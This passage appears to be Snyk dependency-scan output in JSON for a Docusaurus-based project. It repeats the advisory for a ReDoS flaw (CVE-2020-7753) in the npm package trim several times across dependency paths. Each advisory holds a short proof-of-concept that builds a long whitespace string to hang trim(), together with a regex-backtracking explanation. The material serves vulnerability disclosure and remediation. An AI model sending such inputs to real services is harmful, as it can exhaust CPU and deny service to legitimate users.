        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/plugin-google-analytics@2.4.3",
        "@docusaurus/core@2.4.3",
        "@docusaurus/mdx-loader@2.4.3",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/plugin-google-gtag@2.4.3",
        "@docusaurus/core@2.4.3",
        "@docusaurus/mdx-loader@2.4.3",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| 